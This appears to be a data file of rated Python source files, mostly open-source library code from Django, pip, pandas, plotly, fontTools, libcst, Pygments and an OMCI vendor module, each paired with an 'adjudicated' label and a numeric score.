string<<NEWL>>    # to use your own Cloud project.<<NEWL>>    ""gcloud_project_env"": ""GOOGLE_CLOUD_PROJECT"",<<NEWL>>    # 'gcloud_project_env': 'BUILD_SPECIFIC_GCLOUD_PROJECT',<<NEWL>>    # If you need to use a specific version of pip,<<NEWL>>    # change pip_version_override to the string representation<<NEWL>>    # of the version number, for example, ""20.2.4""<<NEWL>>    ""pip_version_override"": None,<<NEWL>>    # A dictionary you want to inject into your test. Don't put any<<NEWL>>    # secrets here. These values will override predefined values.<<NEWL>>    ""envs"": {},<<NEWL>>}"
465	adjudicated	0	"# Copyright (c) Meta Platforms, Inc. and affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>><<NEWL>>import dataclasses<<NEWL>><<NEWL>>from textwrap import dedent<<NEWL>><<NEWL>>import viktor._vendor.libcst as cst<<NEWL>>from viktor._vendor.libcst.metadata import AccessorProvider, MetadataWrapper<<NEWL>>from viktor._vendor.libcst.testing.utils import data_provider, UnitTest<<NEWL>><<NEWL>><<NEWL>>class DependentVisitor(cst.CSTVisitor):<<NEWL>>    METADATA_DEPENDENCIES = (AccessorProvider,)<<NEWL>><<NEWL>>    def __init__(self, *, test: UnitTest) -> None:<<NEWL>>        self.test = test<<NEWL>><<NEWL>>    def on_visit(self, node: cst.CSTNode) -> bool:<<NEWL>>        for f in dataclasses.fields(node):<<NEWL>>            child = getattr(node, f.name)<<NEWL>>            if type(child) is cst.CSTNode:<<NEWL>>                accessor = self.get_metadata(AccessorProvider, child)<<NEWL>>                self.test.assertEqual(accessor, f.name)<<NEWL>><<NEWL>>        return True<<NEWL>><<NEWL>><<NEWL>>class AccessorProviderTest(UnitTest):<<NEWL>>    @data_provider(<<NEWL>>        (<<NEWL>>            (<<NEWL>>                """"""<<NEWL>>                foo = 'toplevel'<<NEWL>>                fn1(foo)<<NEWL>>                fn2(foo)<<NEWL>>                def fn_def():<<NEWL>>                    foo = 'shadow'<<NEWL>>                    fn3(foo)<<NEWL>>                """""",<<NEWL>>            ),<<NEWL>>            (<<NEWL>>                """"""<<NEWL>>                global_var = None<<NEWL>>                @cls_attr<<NEWL>>                class Cls(cls_attr, kwarg=cls_attr):<<NEWL>>                    cls_attr = 5<<NEWL>>                    def f():<<NEWL>>                        pass<<NEWL>>                """""",<<NEWL>>            ),<<NEWL>>            (<<NEWL>>                """"""<<NEWL>>                iterator = None<<NEWL>>                condition = None<<NEWL>>                [elt for target in iterator if condition]<<NEWL>>                {elt for target in iterator if condition}<<NEWL>>                {elt: target for target in iterator if condition}<<NEWL>>                (elt for target in iterator if condition)<<NEWL>>                """""",<<NEWL>>            ),<<NEWL>>        )<<NEWL>>    )<<NEWL>>    def test_accessor_provier(self, code: str) -> None:<<NEWL>>        wrapper = MetadataWrapper(cst.parse_module(dedent(code)))<<NEWL>>        wrapper.visit(DependentVisitor(test=self))"
434	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = ""d F Y""  # 25 Ottobre 2006<<NEWL>>TIME_FORMAT = ""H:i""  # 14:30<<NEWL>>DATETIME_FORMAT = ""l d F Y H:i""  # MercoledÃ¬ 25 Ottobre 2006 14:30<<NEWL>>YEAR_MONTH_FORMAT = ""F Y""  # Ottobre 2006<<NEWL>>MONTH_DAY_FORMAT = ""j F""  # 25 Ottobre<<NEWL>>SHORT_DATE_FORMAT = ""d/m/Y""  # 25/12/2009<<NEWL>>SHORT_DATETIME_FORMAT = ""d/m/Y H:i""  # 25/10/2009 14:30<<NEWL>>FIRST_DAY_OF_WEEK = 1  # LunedÃ¬<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    ""%d/%m/%Y"",  # '25/10/2006'<<NEWL>>    ""%Y/%m/%d"",  # '2006/10/25'<<NEWL>>    ""%d-%m-%Y"",  # '25-10-2006'<<NEWL>>    ""%Y-%m-%d"",  # '2006-10-25'<<NEWL>>    ""%d-%m-%y"",  # '25-10-06'<<NEWL>>    ""%d/%m/%y"",  # '25/10/06'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    ""%d/%m/%Y %H:%M:%S"",  # '25/10/2006 14:30:59'<<NEWL>>    ""%d/%m/%Y %H:%M:%S.%f"",  # '25/10/2006 14:30:59.000200'<<NEWL>>    ""%d/%m/%Y %H:%M"",  # '25/10/2006 14:30'<<NEWL>>    ""%d/%m/%y %H:%M:%S"",  # '25/10/06 14:30:59'<<NEWL>>    ""%d/%m/%y %H:%M:%S.%f"",  # '25/10/06 14:30:59.000200'<<NEWL>>    ""%d/%m/%y %H:%M"",  # '25/10/06 14:30'<<NEWL>>    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'<<NEWL>>    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'<<NEWL>>    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'<<NEWL>>    ""%d-%m-%Y %H:%M:%S"",  # '25-10-2006 14:30:59'<<NEWL>>    ""%d-%m-%Y %H:%M:%S.%f"",  # '25-10-2006 14:30:59.000200'<<NEWL>>    ""%d-%m-%Y %H:%M"",  # '25-10-2006 14:30'<<NEWL>>    ""%d-%m-%y %H:%M:%S"",  # '25-10-06 14:30:59'<<NEWL>>    ""%d-%m-%y %H:%M:%S.%f"",  # '25-10-06 14:30:59.000200'<<NEWL>>    ""%d-%m-%y %H:%M"",  # '25-10-06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = "",""<<NEWL>>THOUSAND_SEPARATOR = "".""<<NEWL>>NUMBER_GROUPING = 3"
400	adjudicated	4	"""""""Stuff that differs in different Python versions and platform<<NEWL>>distributions.""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import os<<NEWL>>import sys<<NEWL>><<NEWL>>__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]<<NEWL>><<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>def has_tls() -> bool:<<NEWL>>    try:<<NEWL>>        import _ssl  # noqa: F401  # ignore unused<<NEWL>><<NEWL>>        return True<<NEWL>>    except ImportError:<<NEWL>>        pass<<NEWL>><<NEWL>>    from pip._vendor.urllib3.util import IS_PYOPENSSL<<NEWL>><<NEWL>>    return IS_PYOPENSSL<<NEWL>><<NEWL>><<NEWL>>def get_path_uid(path: str) -> int:<<NEWL>>    """"""<<NEWL>>    Return path's uid.<<NEWL>><<NEWL>>    Does not follow symlinks:<<NEWL>>        https://github.com/pypa/pip/pull/935#discussion_r5307003<<NEWL>><<NEWL>>    Placed this function in compat due to differences on AIX and<<NEWL>>    Jython, that should eventually go away.<<NEWL>><<NEWL>>    :raises OSError: When path is a symlink or can't be read.<<NEWL>>    """"""<<NEWL>>    if hasattr(os, ""O_NOFOLLOW""):<<NEWL>>        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)<<NEWL>>        file_uid = os.fstat(fd).st_uid<<NEWL>>        os.close(fd)<<NEWL>>    else:  # AIX and Jython<<NEWL>>        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW<<NEWL>>        if not os.path.islink(path):<<NEWL>>            # older versions of Jython don't have `os.fstat`<<NEWL>>            file_uid = os.stat(path).st_uid<<NEWL>>        else:<<NEWL>>            # raise OSError for parity with os.O_NOFOLLOW above<<NEWL>>            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")<<NEWL>>    return file_uid<<NEWL>><<NEWL>><<NEWL>># packages in the stdlib that may have installation metadata, but should not be<<NEWL>># considered 'installed'.  this theoretically could be determined based on<<NEWL>># dist.location (py27:`sysconfig.get_paths()['stdlib']`,<<NEWL>># py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may<<NEWL>># make this ineffective, so hard-coding<<NEWL>>stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}<<NEWL>><<NEWL>><<NEWL>># windows detection, covers cpython and ironpython<<NEWL>>WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
451	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""contour"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
511	adjudicated	3	"#!/usr/bin/env python3<<NEWL>>""""""Session authentication with expiration<<NEWL>>and storage support module for the API.<<NEWL>>""""""<<NEWL>>from flask import request<<NEWL>>from datetime import datetime, timedelta<<NEWL>><<NEWL>>from models.user_session import UserSession<<NEWL>>from .session_exp_auth import SessionExpAuth<<NEWL>><<NEWL>><<NEWL>>class SessionDBAuth(SessionExpAuth):<<NEWL>>    """"""Session authentication class with expiration and storage support.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def create_session(self, user_id=None) -> str:<<NEWL>>        """"""Creates and stores a session id for the user.<<NEWL>>        """"""<<NEWL>>        session_id = super().create_session(user_id)<<NEWL>>        if type(session_id) == str:<<NEWL>>            kwargs = {<<NEWL>>                'user_id': user_id,<<NEWL>>                'session_id': session_id,<<NEWL>>            }<<NEWL>>            user_session = UserSession(**kwargs)<<NEWL>>            user_session.save()<<NEWL>>            return session_id<<NEWL>><<NEWL>>    def user_id_for_session_id(self, session_id=None):<<NEWL>>        """"""Retrieves the user id of the user associated with<<NEWL>>        a given session id.<<NEWL>>        """"""<<NEWL>>        try:<<NEWL>>            sessions = UserSession.search({'session_id': session_id})<<NEWL>>        except Exception:<<NEWL>>            return None<<NEWL>>        if len(sessions) <= 0:<<NEWL>>            return None<<NEWL>>        cur_time = datetime.now()<<NEWL>>        time_span = timedelta(seconds=self.session_duration)<<NEWL>>        exp_time = sessions[0].created_at + time_span<<NEWL>>        if exp_time < cur_time:<<NEWL>>            return None<<NEWL>>        return sessions[0].user_id<<NEWL>><<NEWL>>    def destroy_session(self, request=None) -> bool:<<NEWL>>        """"""Destroys an authenticated session.<<NEWL>>        """"""<<NEWL>>        session_id = self.session_cookie(request)<<NEWL>>        try:<<NEWL>>            sessions = UserSession.search({'session_id': session_id})<<NEWL>>        except Exception:<<NEWL>>            return False<<NEWL>>        if len(sessions) <= 0:<<NEWL>>            return False<<NEWL>>        sessions[0].remove()<<NEWL>>        return True"
500	adjudicated	3	from MySQLdb.constants import FIELD_TYPE<<NEWL>><<NEWL>>from django.contrib.gis.gdal import OGRGeomType<<NEWL>>from django.db.backends.mysql.introspection import DatabaseIntrospection<<NEWL>><<NEWL>><<NEWL>>class MySQLIntrospection(DatabaseIntrospection):<<NEWL>>    # Updating the data_types_reverse dictionary with the appropriate<<NEWL>>    # type for Geometry fields.<<NEWL>>    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()<<NEWL>>    data_types_reverse[FIELD_TYPE.GEOMETRY] = 'GeometryField'<<NEWL>><<NEWL>>    def get_geometry_type(self, table_name, description):<<NEWL>>        with self.connection.cursor() as cursor:<<NEWL>>            # In order to get the specific geometry type of the field,<<NEWL>>            # we introspect on the table definition using `DESCRIBE`.<<NEWL>>            cursor.execute('DESCRIBE %s' %<<NEWL>>                           self.connection.ops.quote_name(table_name))<<NEWL>>            # Increment over description info until we get to the geometry<<NEWL>>            # column.<<NEWL>>            for column, typ, null, key, default, extra in cursor.fetchall():<<NEWL>>                if column == description.name:<<NEWL>>                    # Using OGRGeomType to convert from OGC name to Django field.<<NEWL>>                    # MySQL does not support 3D or SRIDs, so the field params<<NEWL>>                    # are empty.<<NEWL>>                    field_type = OGRGeomType(typ).django<<NEWL>>                    field_params = {}<<NEWL>>                    break<<NEWL>>        return field_type, field_params<<NEWL>><<NEWL>>    def supports_spatial_index(self, cursor, table_name):<<NEWL>>        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB 10.2.2+<<NEWL>>        storage_engine = self.get_storage_engine(cursor, table_name)<<NEWL>>        if storage_engine == 'InnoDB':<<NEWL>>            return self.connection.mysql_version >= (<<NEWL>>                (10, 2, 2) if self.connection.mysql_is_mariadb else (5, 7, 5)<<NEWL>>            )<<NEWL>>        return storage_engine in ('MyISAM', 'Aria')
440	adjudicated	3	"from typing import List, Optional<<NEWL>><<NEWL>>from .base import BaseDistribution, BaseEnvironment, FilesystemWheel, MemoryWheel, Wheel<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""BaseDistribution"",<<NEWL>>    ""BaseEnvironment"",<<NEWL>>    ""FilesystemWheel"",<<NEWL>>    ""MemoryWheel"",<<NEWL>>    ""Wheel"",<<NEWL>>    ""get_default_environment"",<<NEWL>>    ""get_environment"",<<NEWL>>    ""get_wheel_distribution"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>def get_default_environment() -> BaseEnvironment:<<NEWL>>    """"""Get the default representation for the current environment.<<NEWL>><<NEWL>>    This returns an Environment instance from the chosen backend. The default<<NEWL>>    Environment instance should be built from ``sys.path`` and may use caching<<NEWL>>    to share instance state accorss calls.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Environment<<NEWL>><<NEWL>>    return Environment.default()<<NEWL>><<NEWL>><<NEWL>>def get_environment(paths: Optional[List[str]]) -> BaseEnvironment:<<NEWL>>    """"""Get a representation of the environment specified by ``paths``.<<NEWL>><<NEWL>>    This returns an Environment instance from the chosen backend based on the<<NEWL>>    given import paths. The backend must build a fresh instance representing<<NEWL>>    the state of installed distributions when this function is called.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Environment<<NEWL>><<NEWL>>    return Environment.from_paths(paths)<<NEWL>><<NEWL>><<NEWL>>def get_directory_distribution(directory: str) -> BaseDistribution:<<NEWL>>    """"""Get the distribution metadata representation in the specified directory.<<NEWL>><<NEWL>>    This returns a Distribution instance from the chosen backend based on<<NEWL>>    the given on-disk ``.dist-info`` directory.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Distribution<<NEWL>><<NEWL>>    return Distribution.from_directory(directory)<<NEWL>><<NEWL>><<NEWL>>def get_wheel_distribution(wheel: Wheel, canonical_name: str) -> BaseDistribution:<<NEWL>>    """"""Get the representation of the specified wheel's distribution metadata.<<NEWL>><<NEWL>>    This returns a Distribution instance from the chosen backend based on<<NEWL>>    the given wheel's ``.dist-info`` directory.<<NEWL>><<NEWL>>    :param canonical_name: Normalized project name of the given wheel.<<NEWL>>    """"""<<NEWL>>    from .pkg_resources import Distribution<<NEWL>><<NEWL>>    return Distribution.from_wheel(wheel, canonical_name)"
411	adjudicated	0	"from . import DefaultTable<<NEWL>>import sys<<NEWL>>import array<<NEWL>>import logging<<NEWL>><<NEWL>><<NEWL>>log = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>class table__l_o_c_a(DefaultTable.DefaultTable):<<NEWL>><<NEWL>>    dependencies = [""glyf""]<<NEWL>><<NEWL>>    def decompile(self, data, ttFont):<<NEWL>>        longFormat = ttFont[""head""].indexToLocFormat<<NEWL>>        if longFormat:<<NEWL>>            format = ""I""<<NEWL>>        else:<<NEWL>>            format = ""H""<<NEWL>>        locations = array.array(format)<<NEWL>>        locations.frombytes(data)<<NEWL>>        if sys.byteorder != ""big"":<<NEWL>>            locations.byteswap()<<NEWL>>        if not longFormat:<<NEWL>>            l = array.array(""I"")<<NEWL>>            for i in range(len(locations)):<<NEWL>>                l.append(locations[i] * 2)<<NEWL>>            locations = l<<NEWL>>        if len(locations) < (ttFont[""maxp""].numGlyphs + 1):<<NEWL>>            log.warning(<<NEWL>>                ""corrupt 'loca' table, or wrong numGlyphs in 'maxp': %d %d"",<<NEWL>>                len(locations) - 1,<<NEWL>>                ttFont[""maxp""].numGlyphs,<<NEWL>>            )<<NEWL>>        self.locations = locations<<NEWL>><<NEWL>>    def compile(self, ttFont):<<NEWL>>        try:<<NEWL>>            max_location = max(self.locations)<<NEWL>>        except AttributeError:<<NEWL>>            self.set([])<<NEWL>>            max_location = 0<<NEWL>>        if max_location < 0x20000 and all(l % 2 == 0 for l in self.locations):<<NEWL>>            locations = array.array(""H"")<<NEWL>>            for i in range(len(self.locations)):<<NEWL>>                locations.append(self.locations[i] // 2)<<NEWL>>            ttFont[""head""].indexToLocFormat = 0<<NEWL>>        else:<<NEWL>>            locations = array.array(""I"", self.locations)<<NEWL>>            ttFont[""head""].indexToLocFormat = 1<<NEWL>>        if sys.byteorder != ""big"":<<NEWL>>            locations.byteswap()<<NEWL>>        return locations.tobytes()<<NEWL>><<NEWL>>    def set(self, locations):<<NEWL>>        self.locations = array.array(""I"", locations)<<NEWL>><<NEWL>>    def toXML(self, writer, ttFont):<<NEWL>>        writer.comment(""The 'loca' table will be calculated by the compiler"")<<NEWL>>        writer.newline()<<NEWL>><<NEWL>>    def __getitem__(self, index):<<NEWL>>        return self.locations[index]<<NEWL>><<NEWL>>    def __len__(self):<<NEWL>>        return len(self.locations)"
425	adjudicated	1	"from datetime import (<<NEWL>>    datetime,<<NEWL>>    timedelta,<<NEWL>>)<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    DatetimeIndex,<<NEWL>>    NaT,<<NEWL>>    Timestamp,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>def test_unique(tz_naive_fixture):<<NEWL>><<NEWL>>    idx = DatetimeIndex([""2017""] * 2, tz=tz_naive_fixture)<<NEWL>>    expected = idx[:1]<<NEWL>><<NEWL>>    result = idx.unique()<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>>    # GH#21737<<NEWL>>    # Ensure the underlying data is consistent<<NEWL>>    assert result[0] == expected[0]<<NEWL>><<NEWL>><<NEWL>>def test_index_unique(rand_series_with_duplicate_datetimeindex):<<NEWL>>    dups = rand_series_with_duplicate_datetimeindex<<NEWL>>    index = dups.index<<NEWL>><<NEWL>>    uniques = index.unique()<<NEWL>>    expected = DatetimeIndex(<<NEWL>>        [<<NEWL>>            datetime(2000, 1, 2),<<NEWL>>            datetime(2000, 1, 3),<<NEWL>>            datetime(2000, 1, 4),<<NEWL>>            datetime(2000, 1, 5),<<NEWL>>        ]<<NEWL>>    )<<NEWL>>    assert uniques.dtype == ""M8[ns]""  # sanity<<NEWL>>    tm.assert_index_equal(uniques, expected)<<NEWL>>    assert index.nunique() == 4<<NEWL>><<NEWL>>    # GH#2563<<NEWL>>    assert isinstance(uniques, DatetimeIndex)<<NEWL>><<NEWL>>    dups_local = index.tz_localize(""US/Eastern"")<<NEWL>>    dups_local.name = ""foo""<<NEWL>>    result = dups_local.unique()<<NEWL>>    expected = DatetimeIndex(expected, name=""foo"")<<NEWL>>    expected = expected.tz_localize(""US/Eastern"")<<NEWL>>    assert result.tz is not None<<NEWL>>    assert result.name == ""foo""<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>><<NEWL>><<NEWL>>def test_index_unique2():<<NEWL>>    # NaT, note this is excluded<<NEWL>>    arr = [1370745748 + t for t in range(20)] + [NaT.value]<<NEWL>>    idx = DatetimeIndex(arr * 3)<<NEWL>>    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))<<NEWL>>    assert idx.nunique() == 20<<NEWL>>    assert idx.nunique(dropna=False) == 21<<NEWL>><<NEWL>><<NEWL>>def test_index_unique3():<<NEWL>>    arr = [<<NEWL>>        Timestamp(""2013-06-09 02:42:28"") + timedelta(seconds=t) for t in range(20)<<NEWL>>    ] + [NaT]<<NEWL>>    idx = DatetimeIndex(arr * 3)<<NEWL>>    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))<<NEWL>>    assert idx.nunique() == 20<<NEWL>>    assert idx.nunique(dropna=False) == 21<<NEWL>><<NEWL>><<NEWL>>def test_is_unique_monotonic(rand_series_with_duplicate_datetimeindex):<<NEWL>>    index = rand_series_with_duplicate_datetimeindex.index<<NEWL>>    assert not index.is_unique"
474	adjudicated	1	"# Copyright 2018-present Tellabs, Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>>"""""" Tellabs vendor-specific OMCI Entities""""""<<NEWL>><<NEWL>>import inspect<<NEWL>>import structlog<<NEWL>>import sys<<NEWL>><<NEWL>>from scapy.fields import ShortField, IntField, ByteField, StrFixedLenField<<NEWL>>from voltha.extensions.omci.omci_entities import EntityClassAttribute, \<<NEWL>>    AttributeAccess, OmciNullPointer, EntityOperations, EntityClass<<NEWL>><<NEWL>>log = structlog.get_logger()<<NEWL>><<NEWL>># abbreviations<<NEWL>>ECA = EntityClassAttribute<<NEWL>>AA = AttributeAccess<<NEWL>>OP = EntityOperations<<NEWL>><<NEWL>>#################################################################################<<NEWL>># entity class lookup table from entity_class values<<NEWL>>_onu_entity_classes_name_map = dict(<<NEWL>>    inspect.getmembers(sys.modules[__name__], lambda o:<<NEWL>>    inspect.isclass(o) and issubclass(o, EntityClass) and o is not EntityClass)<<NEWL>>)<<NEWL>>_onu_custom_entity_classes = [c for c in _onu_entity_classes_name_map.itervalues()]<<NEWL>>_onu_custom_entity_id_to_class_map = dict()<<NEWL>><<NEWL>><<NEWL>>def onu_custom_me_entities():<<NEWL>>    log.info('onu_custom_me_entities')<<NEWL>><<NEWL>>    if len(_onu_custom_entity_id_to_class_map) == 0:<<NEWL>>        for entity_class in _onu_custom_entity_classes:<<NEWL>>            log.info('adding-custom-me', class_id=entity_class.class_id)<<NEWL>>            assert entity_class.class_id not in _onu_custom_entity_id_to_class_map, \<<NEWL>>                ""Class ID '{}' already exists in the class map"".format(entity_class.class_id)<<NEWL>>            _onu_custom_entity_id_to_class_map[entity_class.class_id] = entity_class<<NEWL>><<NEWL>>    log.info('onu_custom_me_entities', map=_onu_custom_entity_id_to_class_map)<<NEWL>>    return _onu_custom_entity_id_to_class_map<<NEWL>>"
487	adjudicated	0	"import numpy as np<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    Series,<<NEWL>>    Timestamp,<<NEWL>>    date_range,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>>from pandas.api.types import is_scalar<<NEWL>><<NEWL>><<NEWL>>class TestSeriesSearchSorted:<<NEWL>>    def test_searchsorted(self):<<NEWL>>        ser = Series([1, 2, 3])<<NEWL>><<NEWL>>        result = ser.searchsorted(1, side=""left"")<<NEWL>>        assert is_scalar(result)<<NEWL>>        assert result == 0<<NEWL>><<NEWL>>        result = ser.searchsorted(1, side=""right"")<<NEWL>>        assert is_scalar(result)<<NEWL>>        assert result == 1<<NEWL>><<NEWL>>    def test_searchsorted_numeric_dtypes_scalar(self):<<NEWL>>        ser = Series([1, 2, 90, 1000, 3e9])<<NEWL>>        res = ser.searchsorted(30)<<NEWL>>        assert is_scalar(res)<<NEWL>>        assert res == 2<<NEWL>><<NEWL>>        res = ser.searchsorted([30])<<NEWL>>        exp = np.array([2], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)<<NEWL>><<NEWL>>    def test_searchsorted_numeric_dtypes_vector(self):<<NEWL>>        ser = Series([1, 2, 90, 1000, 3e9])<<NEWL>>        res = ser.searchsorted([91, 2e6])<<NEWL>>        exp = np.array([3, 4], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)<<NEWL>><<NEWL>>    def test_searchsorted_datetime64_scalar(self):<<NEWL>>        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))<<NEWL>>        val = Timestamp(""20120102"")<<NEWL>>        res = ser.searchsorted(val)<<NEWL>>        assert is_scalar(res)<<NEWL>>        assert res == 1<<NEWL>><<NEWL>>    def test_searchsorted_datetime64_scalar_mixed_timezones(self):<<NEWL>>        # GH 30086<<NEWL>>        ser = Series(date_range(""20120101"", periods=10, freq=""2D"", tz=""UTC""))<<NEWL>>        val = Timestamp(""20120102"", tz=""America/New_York"")<<NEWL>>        res = ser.searchsorted(val)<<NEWL>>        assert is_scalar(res)<<NEWL>>        assert res == 1<<NEWL>><<NEWL>>    def test_searchsorted_datetime64_list(self):<<NEWL>>        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))<<NEWL>>        vals = [Timestamp(""20120102""), Timestamp(""20120104"")]<<NEWL>>        res = ser.searchsorted(vals)<<NEWL>>        exp = np.array([1, 2], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)<<NEWL>><<NEWL>>    def test_searchsorted_sorter(self):<<NEWL>>        # GH8490<<NEWL>>        ser = Series([3, 1, 2])<<NEWL>>        res = ser.searchsorted([0, 3], sorter=np.argsort(ser))<<NEWL>>        exp = np.array([0, 2], dtype=np.intp)<<NEWL>>        tm.assert_numpy_array_equal(res, exp)"
398	adjudicated	3	"""""""<<NEWL>>    pygments.styles.vim<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    A highlighting style for Pygments, inspired by vim.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace, Token<<NEWL>><<NEWL>><<NEWL>>class VimStyle(Style):<<NEWL>>    """"""<<NEWL>>    Styles somewhat like vim 7.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    background_color = ""#000000""<<NEWL>>    highlight_color = ""#222222""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Token:                     ""#cccccc"",<<NEWL>>        Whitespace:                """",<<NEWL>>        Comment:                   ""#000080"",<<NEWL>>        Comment.Preproc:           """",<<NEWL>>        Comment.Special:           ""bold #cd0000"",<<NEWL>><<NEWL>>        Keyword:                   ""#cdcd00"",<<NEWL>>        Keyword.Declaration:       ""#00cd00"",<<NEWL>>        Keyword.Namespace:         ""#cd00cd"",<<NEWL>>        Keyword.Pseudo:            """",<<NEWL>>        Keyword.Type:              ""#00cd00"",<<NEWL>><<NEWL>>        Operator:                  ""#3399cc"",<<NEWL>>        Operator.Word:             ""#cdcd00"",<<NEWL>><<NEWL>>        Name:                      """",<<NEWL>>        Name.Class:                ""#00cdcd"",<<NEWL>>        Name.Builtin:              ""#cd00cd"",<<NEWL>>        Name.Exception:            ""bold #666699"",<<NEWL>>        Name.Variable:             ""#00cdcd"",<<NEWL>><<NEWL>>        String:                    ""#cd0000"",<<NEWL>>        Number:                    ""#cd00cd"",<<NEWL>><<NEWL>>        Generic.Heading:           ""bold #000080"",<<NEWL>>        Generic.Subheading:        ""bold #800080"",<<NEWL>>        Generic.Deleted:           ""#cd0000"",<<NEWL>>        Generic.Inserted:          ""#00cd00"",<<NEWL>>        Generic.Error:             ""#FF0000"",<<NEWL>>        Generic.Emph:              ""italic"",<<NEWL>>        Generic.Strong:            ""bold"",<<NEWL>>        Generic.Prompt:            ""bold #000080"",<<NEWL>>        Generic.Output:            ""#888"",<<NEWL>>        Generic.Traceback:         ""#04D"",<<NEWL>><<NEWL>>        Error:                     ""border:#FF0000""<<NEWL>>    }"
